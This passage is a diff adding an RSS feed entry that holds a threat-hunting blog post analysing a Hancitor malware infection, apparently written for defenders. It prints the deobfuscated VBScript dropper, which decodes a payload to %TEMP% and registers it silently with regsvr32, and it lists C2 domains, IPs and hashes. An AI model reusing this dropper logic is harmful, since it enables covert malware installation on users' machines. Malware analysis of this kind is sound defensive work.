+l69l69l69l69l133l69l69l133l115l183l170l177l180l168l69l69l289l75l69l69l69l85l...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;There’s also a huge variable defined with a &lt;code class=&quot;highlighter-rouge&quot;&gt;Split&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SsfkRq=Split(&quot;108,121,175,31,34,31,31,31,35,31...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Beyond the basics of what a &lt;code class=&quot;highlighter-rouge&quot;&gt;Split&lt;/code&gt; is, I’m not sure what that is doing. It is referenced below with &lt;code class=&quot;highlighter-rouge&quot;&gt;.WriteText YZyNjfA(SsfkRq)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Stripping all that out, we’re left with:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Function YZyNjfA(YRMVEpWm)
+svNcfFav=&quot;&quot;
+'Function siahdgfkiqadsf
+ZBgKJYn=0
+adsfsdasd=31
+'numbers=3782347438234
+'UBoundWhileFunctionEnds
+Do While ZBgKJYn =&amp;lt; UBound(YRMVEpWm)
+svNcfFav=svNcfFav+ChrW(YRMVEpWm(ZBgKJYn)-adsfsdasd)
+'End Function
+ZBgKJYn=ZBgKJYn+1
+Loop
+'.Close
+YZyNjfA=svNcfFav
+End Function
+Dim GtYbDTHjR: Set GtYbDTHjR=CreateObject(&quot;Scripting.FileSystemObject&quot;): Dim etEWDmZOL: Set etEWDmZOL=CreateObject(&quot;ADODB.Stream&quot;)
+With etEWDmZOL
+.Type=2
+.Charset=&quot;ISO-8859-1&quot;
+.Open()
+.WriteText YZyNjfA(SsfkRq)
+
+.Position=0
+.SaveToFile CStr(WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(2)+&quot;\&quot;)+&quot;adobe.txt&quot;, 2
+.Close
+End With
+Set HeJddyu=GetObject(&quot;winmgmts:Win32_Process&quot;)
+With HeJddyu
+.Create &quot;regsvr32.exe -s &quot;+CStr(WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(Cint(&quot;2&quot;))+&quot;\&quot;)+&quot;adobe.txt&quot;,,,processid
+End With
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is a bit beyond my bailiwick of network analysis, but it appears that it is a timer that counts down by &lt;code class=&quot;highlighter-rouge&quot;&gt;31&lt;/code&gt;, listens to a stream for a file that it writes as &lt;code class=&quot;highlighter-rouge&quot;&gt;abobe.txt&lt;/code&gt;, and finally the file is registered as a DLL on the system.&lt;/p&gt;
+
+&lt;p&gt;So, that’s great, but I wasn’t able to extract &lt;code class=&quot;highlighter-rouge&quot;&gt;adobe.txt&lt;/code&gt; without some help. I called in a lifeline with the great Dustin Lee (&lt;a href=&quot;https://twitter.com/_dustinlee&quot;&gt;@_dustinlee&lt;/a&gt;) who suggested (correctly) to remove the part of the script that actually executes the binary and it should drop it in the &lt;code class=&quot;highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt;directory as denoted by &lt;code class=&quot;highlighter-rouge&quot;&gt;.SaveToFile CStr(WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(2)+&quot;\&quot;)+&quot;adobe.txt&quot;, 2&lt;/code&gt;. So, I removed the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Set HeJddyu=GetObject(&quot;winmgmts:Win32_Process&quot;)
+With HeJddyu
+.Create &quot;regsvr32.exe -s &quot;+CStr(WScript.CreateObject(&quot;Scripting.FileSystemObject&quot;).GetSpecialFolder(Cint(&quot;2&quot;))+&quot;\&quot;)+&quot;adobe.txt&quot;,,,processid
+End With
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;After removing that, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;cscript SE670131329809.vbs&lt;/code&gt;, and there in &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\AppData\Local\Temp&lt;/code&gt; was &lt;code class=&quot;highlighter-rouge&quot;&gt;adobe.txt&lt;/code&gt;! Phew…from my foxhole, quite a hard fought collection.&lt;/p&gt;
+
+&lt;p&gt;Okay, let’s look at the metadata here. Of note, it’s a DLL (which we expected from the DLL registration routine in the script &lt;code class=&quot;highlighter-rouge&quot;&gt;Create &quot;regsvr32.exe -s &quot;&lt;/code&gt;), it’s called “Windows Media Center Store ipdate Manager” (looks like a typo - nice indicator to search for).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/local/bin/exiftool adobe.txt
+ExifTool Version Number         : 11.30
+File Name                       : adobe.txt
+Directory                       : .
+File Size                       : 248 kB
+File Modification Date/Time     : 2020:03:19 18:02:20-05:00
+File Access Date/Time           : 2020:03:19 18:05:41-05:00
+File Inode Change Date/Time     : 2020:03:19 18:05:41-05:00
+File Permissions                : rwxr-xr-x
+File Type                       : Win32 DLL
+File Type Extension             : dll
+MIME Type                       : application/octet-stream
+Machine Type                    : Intel 386 or later, and compatibles
+Time Stamp                      : 2020:03:10 06:41:39-05:00
+Image File Characteristics      : Executable, No line numbers, No symbols, 32-bit, DLL
+PE Type                         : PE32
+Linker Version                  : 2.50
+Code Size                       : 113152
+Initialized Data Size           : 140288
+Uninitialized Data Size         : 0
+Entry Point                     : 0x1c000
+OS Version                      : 4.0
+Image Version                   : 0.0
+Subsystem Version               : 4.0
+Subsystem                       : Windows GUI
+File Version Number             : 6.1.7601.17514
+Product Version Number          : 6.1.7601.17514
+File Flags Mask                 : 0x003f
+File Flags                      : (none)
+File OS                         : Windows NT 32-bit
+Object File Type                : Dynamic link library
+File Subtype                    : 0
+Language Code                   : English (U.S.)
+Character Set                   : Unicode
+Company Name                    : Microsoft Corporation
+File Description                : Windows Media Center Store ipdate Manager
+File Version                    : 6.1.7601.17514 (win7sp1_rtm.101119-1850)
+Internal Name                   : mcipdate.exe
+Legal Copyright                 : © Microsoft Corporation. All rights reserved.
+Original File Name              : mcipdate.exe
+Product Name                    : Microsoft® Windows® Operating System
+Product Version                 : 6.1.7601.17514
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Grabbing a quick hash and checking it on VirusTotal identified this as &lt;a href=&quot;https://www.virustotal.com/gui/file/291a4eb06358eca87fbc1f133ee162b6c532f4ec3e6f39c2646cde5de60e80f9/detection&quot;&gt;Hancitor&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;Okay, moving on to &lt;code class=&quot;highlighter-rouge&quot;&gt;shop[.]artaffinittee[.]com&lt;/code&gt;, which as a reminder, we identified this by profiling DNS traffic above.&lt;/p&gt;
+
+&lt;p&gt;There are three things that we can dig into:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/wp-includes/sodium_compat/1&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;19fe0b844a00c57f60a0d9d29e6974e7&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/wp-includes/sodium_compat/2&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;204f36fb236065964964a61d4d7b1b9c&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shop[.]artaffinittee[.]com&lt;/code&gt;’s IP address of &lt;code class=&quot;highlighter-rouge&quot;&gt;68[.]183[.]232[.]255&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s first see if anyone else went that IP address, which they didn’t, so we can list that as an indicator, but there’s nothing else to dig in there (we’ll do some IP analysis towards the end).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Grabbing the packets for &lt;code class=&quot;highlighter-rouge&quot;&gt;/wp-includes/sodium_compat/{1,2}&lt;/code&gt;, we can see that we’re dealing with a binary file that we can probably do some analysis of.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/3-20-20-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When pulling the files apart, they’re binary files but they seem like they’re into the RE category, which is beyond my capabilities. Of note, they are listed as indicators by a DigitalSide OSINT TI list.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;2767&quot;: {
+    &quot;md5&quot;: &quot;19fe0b844a00c57f60a0d9d29e6974e7&quot;,
+    &quot;sha1&quot;: &quot;3505b4a6cd2f1bf3cb3628b9e3eb25c940ab559a&quot;,
+    &quot;sha256&quot;: &quot;d1e56e455e3a50d8e461665e46deb1979a642b32710433f59e7a16fb5e4abada&quot;,
+    &quot;url&quot;: [
+        &quot;http://beta.artaffinittee.com/wp-includes/fonts/1&quot; &amp;lt;- note different URI, but same file
+    ]
+},
+&quot;2768&quot;: {
+    &quot;md5&quot;: &quot;204f36fb236065964964a61d4d7b1b9c&quot;,
+    &quot;sha1&quot;: &quot;b383d4aedea5de89a73d2cfda9d3bfdef94540ea&quot;,
+    &quot;sha256&quot;: &quot;4c8c3005642b01eb3db098b34ce3c7a089f12566bd67a7720c48e2fe751bfcb1&quot;,
+    &quot;url&quot;: [
+        &quot;http://beta.artaffinittee.com/wp-includes/fonts/2&quot; &amp;lt;- note different URI, but same file
+    ]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+&lt;p&gt;So, using ROCK, we identified a malicious domain that led us all the way back through the compromise to the initial point of infection and collected several observations along the way. Check out the detection logic for signatures and analysis.&lt;/p&gt;
+
+&lt;h2 id=&quot;detection-logic&quot;&gt;Detection Logic&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/huntops-blue/detection-logic/blob/master/hancitor.md&quot;&gt;Additional analysis, modeling, and signatures (KQL and Yara)&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;artifacts&quot;&gt;Artifacts&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;45[.]153[.]73[.]33 - Pony Downloader C2
+thumbeks[.]com - Pony Downloader C2
+/4/forum[.]php - Hancitor C2
+/d2/about[.]php - Pony Downloader C2
+/mlu/forum[.]php - Pony Downloader C2
+freetospeak[.]me - Initial Infection
+68[.]208[.]77[.]171 - Initial Infection
+shop[.]artaffinittee[.]com - Part of Hancitor infrastructure
+68[.]183[.]232[.]255 - Part of Hancitor infrastructure
+5c9c955449d010d25a03f8cef9d96b41 - VBScript archive (0843_43.php)
+8eb933c84e7777c7b623f19489a59a2a - VBScript dropper (SE670131329809.vbs)
+6ad619702dad7c8fc1cefd3bc7967cf4 - Hancitor binary
+19fe0b844a00c57f60a0d9d29e6974e7 - Part of Hancitor infrastructure (1)
+204f36fb236065964964a61d4d7b1b9c - Part of Hancitor infrastructure (2)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Until next time, cheers and happy hunting!&lt;/p&gt;
+</description>
+                <pubDate>Fri, 20 Mar 2020 00:00:00 -0500</pubDate>
+                <link>http://localhost:4000/2020/03/20/hancitor.html</link>
+                <guid isPermaLink="true">http://localhost:4000/2020/03/20/hancitor.html</guid>
+                
+                <category>feed</category>
+                
+                
+            </item>
         
             <item>
                 <title>3/6/2020 - Trickbot Infection</title>
